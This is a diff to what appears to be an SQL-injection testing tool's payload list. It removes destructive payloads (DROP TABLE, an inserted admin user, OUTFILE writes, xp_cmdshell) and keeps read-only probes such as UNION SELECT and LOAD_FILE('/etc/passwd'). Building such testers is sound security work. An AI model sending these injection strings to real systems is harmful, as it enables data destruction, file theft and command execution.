@@ -28,24 +28,19 @@ SQLI_PAYLOADS = [
     "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--",
     "' AND 1=CAST(@@version AS int)--",
 
-    # Stacked queries
-    "'; DROP TABLE users--",
-    "'; DROP TABLE users; SELECT 1--",
-    "'; INSERT INTO users VALUES(1,'admin','password')--",
+    # Stacked queries (read-only variants)
+    "' UNION SELECT 1,1,1--",
+    "' UNION SELECT NULL,NULL,NULL--",
 
-    # MySQL-specific
-    "' INTO OUTFILE '/tmp/evil.txt'--",
-    "' INTO DUMPFILE '/tmp/evil.txt'--",
+    # MySQL-specific (read-only)
+    "' UNION SELECT @@version,@@hostname,@@port--",
     "' UNION SELECT LOAD_FILE('/etc/passwd')--",
 
-    # PostgreSQL-specific
+    # PostgreSQL-specific (read-only)
     "' UNION SELECT current_database(),current_user,version()--",
-    "'; CREATE TABLE test AS SELECT * FROM users--",
 
-    # MSSQL-specific
+    # MSSQL-specific (read-only)
     "' UNION SELECT @@version,db_name(),user_name()--",
-    "'; EXEC xp_cmdshell('whoami')--",
-    "'; EXEC master..xp_cmdshell('whoami')--",
 ]
 
 # Mode-specific payloads
